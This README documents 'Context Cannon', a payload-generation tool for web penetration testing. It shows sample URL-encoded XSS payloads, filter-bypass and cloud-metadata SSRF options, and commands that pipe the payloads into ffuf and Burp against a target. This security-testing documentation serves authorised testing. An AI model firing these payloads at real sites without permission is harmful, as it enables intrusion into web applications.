<p align="center">
  <h1 align="center">Context Cannon</h1>
  <p align="center">
    <b>Payload generation that adapts to context and filters.</b>
    <br />
    <i>XSS, SQLi, SSTI, SSRF, LFI — encoded and filtered for your exact injection point.</i>
  </p>
</p>

<p align="center">
  <a href="#the-problem">The Problem</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#usage">Usage</a> &bull;
  <a href="#supported-types">Supported Types</a> &bull;
  <a href="#encoding">Encoding</a>
</p>

---

Generic payload lists waste time. If you know you're injecting into a double-quoted HTML attribute with `script` filtered, you need payloads that fit **that exact context**. Context Cannon generates targeted payloads based on vulnerability type, injection context, blocked strings, and encoding requirements.

```bash
$ context-cannon -t xss -c attribute_double --filter "script" -e url
  1. %22%20onmouseover%3D%22alert%281%29
  2. %22%20onfocus%3D%22alert%281%29%22%20autofocus%3D%22
  3. %22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

## The Problem

You find a reflected parameter. You know:
- It's inside a `<div class="VALUE">` (double-quoted attribute)
- The WAF blocks `script`
- URL encoding passes through

Copying from a generic payload list means manually filtering, encoding, and adapting each payload. Context Cannon does this in one command.

## Install

```bash
git clone https://github.com/invaen/context-cannon.git
cd context-cannon
python context_cannon.py -t xss -c html

# Or install with pip
pip install .
context-cannon -t xss -c html
```

**Requirements:** Python 3.8+. No external packages.

## Usage

```bash
# List all available vulnerability types and contexts
context-cannon --list

# Generate XSS payloads for HTML body context
context-cannon -t xss -c html

# XSS for double-quoted attribute injection
context-cannon -t xss -c attribute_double

# XSS avoiding blocked strings
context-cannon -t xss --filter "script,alert,onerror"

# SQLi for MySQL, URL encoded
context-cannon -t sqli -c mysql -e url

# SSTI detection payloads
context-cannon -t ssti -c detection

# SSRF with cloud metadata payloads
context-cannon -t ssrf -c cloud_meta

# LFI with PHP wrapper payloads
context-cannon -t lfi -c wrapper

# Save output to file (for feeding into ffuf, Burp Intruder, etc.)
context-cannon -t xss -c waf_bypass -o payloads.txt
```

## Supported Types

### XSS Contexts
| Context | Injection Point |
|---------|----------------|
| `html` | Inside HTML body (`<div>INJECT</div>`) |
| `no_script` | `<script>` tag is filtered |
| `no_parentheses` | Parentheses are filtered |
| `attribute_double` | Inside double-quoted attribute (`"INJECT"`) |
| `attribute_single` | Inside single-quoted attribute (`'INJECT'`) |
| `javascript` | Inside JavaScript string context |
| `waf_bypass` | Case manipulation, encoding, whitespace tricks |

### SQLi Contexts
| Context | Target |
|---------|--------|
| `detection` | Boolean/error-based detection probes |
| `mysql` | MySQL-specific (UNION, SLEEP, extractvalue) |
| `postgres` | PostgreSQL-specific (pg_sleep) |
| `mssql` | MSSQL-specific (WAITFOR DELAY) |
| `bypass` | Comment injection, case manipulation |

### SSTI Contexts
| Context | Template Engine |
|---------|----------------|
| `detection` | Engine-agnostic detection (`{{7*7}}`, `${7*7}`) |
| `jinja2` | Jinja2/Flask exploitation |
| `twig` | Twig/Symfony exploitation |
| `erb` | ERB/Ruby exploitation |
| `velocity` | Apache Velocity exploitation |
| `freemarker` | FreeMarker exploitation |

### SSRF Contexts
| Context | Target |
|---------|--------|
| `localhost` | Localhost bypass variants (decimal IP, IPv6, hex) |
| `cloud_meta` | AWS/GCP metadata endpoints |
| `bypass` | DNS rebinding services |

### LFI Contexts
| Context | Target |
|---------|--------|
| `basic` | Path traversal with encoding variants |
| `windows` | Windows-specific paths |
| `wrapper` | PHP wrappers (filter, input) |

## Encoding

Apply encoding to all generated payloads:

| Flag | Encoding |
|------|----------|
| `-e url` | URL encoding (`%3C`, `%3E`) |
| `-e url_full` | Full URL encoding (spaces as `+`) |
| `-e html` | HTML entity encoding (`&lt;`, `&gt;`) |
| `-e base64` | Base64 encoding |
| `-e hex` | Hex encoding (`%3c%73%63%72%69%70%74%3e`) |
| `-e double_url` | Double URL encoding |

## Pipeline Integration

```bash
# Feed directly into ffuf
context-cannon -t xss -c attribute_double -o /tmp/xss.txt
ffuf -u "https://target.com/search?q=FUZZ" -w /tmp/xss.txt -mc all -mr "onerror|onfocus"

# Feed into Burp Intruder (copy payloads)
context-cannon -t sqli -c mysql | pbcopy

# Combine with filter bypass
context-cannon -t xss --filter "script,alert,onerror,onload" -e url
```

## Legal Disclaimer

This tool is intended for **authorized security testing only** — bug bounty programs, penetration tests, and CTF challenges where you have explicit permission. The author assumes no liability for misuse.

## License

MIT
